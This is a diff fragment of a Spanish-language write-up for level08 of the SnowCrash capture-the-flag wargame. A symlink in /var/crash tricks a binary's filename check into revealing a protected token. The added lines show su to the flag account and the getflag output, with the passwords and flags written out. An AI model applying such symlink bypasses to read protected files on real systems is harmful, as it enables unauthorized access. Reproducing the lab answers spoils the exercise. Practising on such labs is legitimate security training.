@@ -70,3 +70,9 @@ ln -s /home/user/level08/token /var/crash/mitk
 ejecutando luego ./level08 /var/crash/mitk obtenemos el token
 
 quif5eloekouj29ke0vouxean
+
+level08@SnowCrash:~$ su flag08
+Password: quif5eloekouj29ke0vouxean
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
